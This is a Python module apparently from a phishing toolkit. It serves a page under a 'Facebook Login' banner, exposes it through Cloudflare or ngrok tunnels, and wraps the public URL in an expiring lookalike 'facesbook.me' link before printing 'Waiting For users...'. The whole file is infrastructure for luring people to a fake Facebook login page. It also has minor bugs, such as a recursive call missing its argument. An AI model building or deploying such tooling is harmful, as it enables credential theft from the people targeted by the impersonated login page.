import os
import shutil
import re
import requests
import threading
import zipfile
from urllib.parse import urlparse
import platform
import tarfile
import time
from urllib.parse import unquote
import webbrowser
from http.server import SimpleHTTPRequestHandler, HTTPStatus
import socketserver
import subprocess
from pyngrok import ngrok
from pyfiglet import Figlet
from termcolor import colored
from datetime import datetime, timedelta, timezone
from tzlocal import get_localzone
import pytz
from threading import Thread
from scripts.install import install_cloudflared
from controllers.Controller import MyHandler
import socket
import platform
import sys

red='red'
green='green'
yellow='yellow'

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def small_title_fb():
    clear_terminal()
    fb_login = """
 █▀▀ ▄▀█ █▀▀ █▀▀ █▄▄ █▀█ █▀█ █▄▀   █░░ █▀█ █▀▀ █ █▄░█
 █▀░ █▀█ █▄▄ ██▄ █▄█ █▄█ █▄█ █░█   █▄▄ █▄█ █▄█ █ █░▀█"""

    print(colored(fb_login,color=red))

def small_title_setup_server():
    clear_terminal()
    server = """
 █▀ █▀▀ ▀█▀ █░█ █▀█   █▀ █▀▀ █▀█ █░█ █▀▀ █▀█
 ▄█ ██▄ ░█░ █▄█ █▀▀   ▄█ ██▄ █▀▄ ▀▄▀ ██▄ █▀▄"""
    print(colored(server, color=red))

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', int(port))) == 0
    
def type_port(filepath):
   port = input('   \n\033[32mType your port:\033[0m ')
   if is_port_in_use(port):
         small_title_setup_server()
         print(f"\n\033[31mError: Port {port} is already in use. Choose a different port.\033[0m")
         type_port()
   start_server(port, filepath)


def print_colored_text_with_animation(text, color='red', delay=0.03):
    for line in text.split('\n'):
        type_animation(line, color=color, delay=delay)

def type_animation(text, color='red', delay=0.03):
    for char in text:
        colored_char = colored(char, color=color)
        print(colored_char, end='', flush=True)
        time.sleep(delay)
    print()

def setup_server(filepath):
  small_title_setup_server()
  type_port(filepath)

def choice_server(httpd_thread, httpd, port):
    try:
      menu_text = """
   1 -> Cloudflare
   2 -> Back
     """
      print_colored_text_with_animation(menu_text, color=green, delay=0.03)
      user_choice = input('\033[32mSelect server:\033[0m ')
  
      if user_choice == '1':
        install_cloudflared(httpd, port)
        start_cloudflared(httpd, port)
      elif user_choice == '2':
           from zynn import main
           try:
              httpd.shutdown()
              httpd_thread.join()
           except Exception as e:
             print(f"Error during shutdown: {e}")
           main()
      else:
           clear_terminal()
           small_title_setup_server()
           print(colored('\nInvalid choice. Please select a valid option.', color='red'))
           choice_server(httpd_thread, httpd, port)
    #    elif user_choice == '2':
    #       start_ngrok(httpd, port)
    except KeyboardInterrupt:
       httpd.shutdown()
       httpd.server_close()
       clear_terminal()

def start_server(port,filepath):
  with socketserver.TCPServer(("", int(port)),  lambda *args, **kwargs: MyHandler(*args, filepath=filepath, **kwargs)) as httpd:
    print(colored("\nServing at localhost:" + port, color=green))
    httpd_thread = threading.Thread(target=httpd.serve_forever)
    httpd_thread.start()
    choice_server(httpd_thread,httpd, port)

def start_ngrok(httpd, port):
    try:
        ngrok_tunnel = ngrok.connect(port)
        public_url = ngrok_tunnel.public_url
        print("    Serving at localhost:" + port)
        link_created = False
        if public_url and not link_created:
                try:
                  fb_url, expiration, error = make_fb_link(public_url)
                except:
                  fb_url, expiration, error = None
                if not error:
                   formatted_expiration = expiration.strftime("%Y-%m-%d %I:%M:%S %p")
                   small_title_fb()
                   print(f"\n\033[32mfacesbook.me Url: \033[0m\033[34m{fb_url}\033[0m")
                   print(f"\n\033[32mfacesbook.me Expire Time: \033[0m\033[33m{formatted_expiration}\033[0m")
                   print(f"\n\033[32mNgrok Url: \033[0m\033[34m{public_url}\033[0m")
                   print(f"\n\033[32mWaiting For users... \033")
                   link_created = True
                   def check_expiration():
                       while True:
                           # Get the current time in the user's timezone
                           user_timezone = get_localzone()
                           current_time = datetime.now(user_timezone)
               
                           # Check if the expiration time has passed
                           if current_time > expiration:
                               print(colored("\nWarning: facesbook.me link has expired.but you can use the ngrok link", color=yellow))
                               break
                           # Sleep for a certain interval (e.g., 1 minute)
                           time.sleep(60)
               
                   # Start a new thread to check expiration
                   expiration_thread = Thread(target=check_expiration)
                   expiration_thread.start()
                else:
                   clear_terminal()
                   ngrok.kill()
                   print(colored(f"\nError: {error}", color=red))
                   start_ngrok(httpd, port)

        httpd.serve_forever()
    except Exception as e:
        # Handle Ngrok connection errors or any other exceptions
        print(f"Error starting Ngrok: {e}")
    finally:
        # Stop ngrok process
        ngrok.kill()

def start_cloudflared(httpd, port):
    cloudflared_log_path = "server/.cld.log"
    with open(cloudflared_log_path, 'w') as log_file:
         log_file.write("")

    if platform.system().lower() == "linux":
        # Check if the 'termux-chroot' command is available
       if shutil.which("termux-chroot"):
        cloudflared_process = subprocess.Popen(['termux-chroot', './server/cloudflared', 'tunnel', '--url', f'http://localhost:{port}', '--logfile', cloudflared_log_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
       else:
        # Run the Linux command
        cloudflared_process = subprocess.Popen(['./server/cloudflared', 'tunnel', '--url', f'http://localhost:{port}', '--logfile', cloudflared_log_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    else:
       # Modify the command for Windows or other operating systems
      cloudflared_process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{port}', '--logfile', cloudflared_log_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
  
    link_created = False

    try:
      while True:
        with open(cloudflared_log_path, 'r') as log_file:
            log_contents = log_file.read()
            match = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents)
            if match and not link_created:
                cldflr_url = match.group(0)
                try:
                  fb_url, expiration, error = make_fb_link(cldflr_url)
                except:
                  print(f"\n\033[32mfacesbook.me Url: ERROR")
                  print(f"\n\033[32mfacesbook.me Expire in: ERROR")
                  print(f"\n\033[32mCloudflared Url: \033[0m\033[34m{cldflr_url}\033[0m")
                  return
                if not error:
                #    formatted_expiration = expiration.strftime("%Y-%m-%d %I:%M:%S %p")
                   current_time = datetime.now(timezone.utc)  # Current time with UTC timezone

                   # Calculate the time remaining
                   time_remaining = expiration - current_time
                   
                   # Format the time remaining
                   days, seconds = divmod(time_remaining.seconds + time_remaining.days * 86400, 86400)
                   hours, seconds = divmod(seconds, 3600)
                   minutes, seconds = divmod(seconds, 60)
                   
                   formatted_remaining_time = "{:02}d {:02}h {:02}m {:02}s".format(days, hours, minutes, seconds)
                   small_title_fb()
                   print(f"\n\033[32mfacesbook.me Url: \033[0m\033[34m{fb_url}\033[0m")
                   print(f"\n\033[32mfacesbook.me Expire in: \033[0m\033[33m{formatted_remaining_time}\033[0m")
                   print(f"\n\033[32mCloudflared Url: \033[0m\033[34m{cldflr_url}\033[0m")
                   print(f"\n\033[32mWaiting For users... \033")
                   link_created = True
                   
                #    def check_expiration():
                #               while True:
                #                   # Get the current time in the user's timezone
                #                   user_timezone = get_localzone()
                #                   current_time = datetime.now(user_timezone)
                      
                #                   # Check if the expiration time has passed
                #                   if current_time > expiration:
                #                       print(colored("\nWarning: facesbook.me link has expired, but you can use the cloudflared link", color='yellow'))
                #                       break
                      
                #                   # Sleep for a certain interval (e.g., 1 minute)
                #                   time.sleep(60)
                #    expiration_thread = Thread(target=check_expiration)
                #    expiration_thread.start()

                else:
                   clear_terminal()
                   print(colored(f"\nError: {error}", color=red))
                   start_cloudflared(httpd, port)
    except KeyboardInterrupt:
       httpd.shutdown()
       httpd.server_close()
       clear_terminal()

def make_fb_link(url):
    expire_time = input(f'{colored("Enter Expire time for facesbook.me (1 = 1 minute, max: 60 minutes):", color=green )}')
    fb_url = f"http://localhost:8000/?url={url}&expiration={expire_time}"

    # Make a request to the server
    response = requests.get(fb_url)

    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        data = response.json()
        # Extract URL and expiration
        fb_url = data.get("url")
        timestamp = data.get("timestamp")
    
        # Get the user's local timezone
        user_timezone = get_localzone()
        
        # Convert the timestamp to a datetime object
        utc_datetime = datetime.utcfromtimestamp(timestamp)
        
        # Convert the UTC datetime to the user's timezone
        user_datetime = utc_datetime.replace(tzinfo=pytz.UTC).astimezone(user_timezone)
        
        # Set expiration as a datetime object
        expiration = user_datetime
        
        return fb_url, expiration, None
    else:
        error = response.json()
        return None, None, error
